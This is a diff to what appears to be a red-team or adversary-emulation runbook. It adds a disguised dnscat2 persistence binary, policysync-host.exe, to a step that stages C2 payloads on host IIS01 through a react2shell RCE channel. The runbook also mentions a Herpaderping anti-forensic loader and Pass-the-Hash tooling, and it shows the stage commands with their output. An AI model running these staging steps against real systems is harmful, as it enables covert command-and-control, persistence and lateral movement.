@@ -23,7 +23,7 @@ intentional anti-forensic behaviour baked into the loader. Before lateral moveme
 can proceed, the dnscat2 payload and its Herpaderping loader must be re-staged on
 IIS01. The remaining tools — `go-thehash.exe` for Pass-the-Hash lateral movement,
 Windows service installer binaries, and the persistence-specific dnscat2 executables
-(`policyupdate.exe`, `policysync.exe`) — are staged to IIS01 here for the first time.
+(`policyupdate.exe`, `policysync.exe`, `policysync-host.exe`) — are staged to IIS01 here for the first time.
 
 All staging uses the react2shell `stage` command: the attacker's Python tool reads
 each binary locally, base64-encodes in Python memory, streams 2000-character chunks
@@ -127,6 +127,7 @@ No new exploitation or network exposure is required; the existing
   ```
   stage ../../rce-and-c2/dnscat2/go-client/dnscat2.exe C:\ProgramData\policyupdate.bin
   stage ../../rce-and-c2/dnscat2/go-client/policysync.exe C:\ProgramData\policysync.bin
+  stage ../../rce-and-c2/dnscat2/go-client/policysync-host.exe C:\ProgramData\policysync-host.bin
   ```
 
   - ***Expected Output***
@@ -134,6 +135,7 @@ No new exploitation or network exposure is required; the existing
     ```text
     [+] File staged successfully -> C:\ProgramData\policyupdate.bin (... bytes)
     [+] File staged successfully -> C:\ProgramData\policysync.bin (... bytes)
+    [+] File staged successfully -> C:\ProgramData\policysync-host.bin (... bytes)
     ```
 
 ### Reference Tables
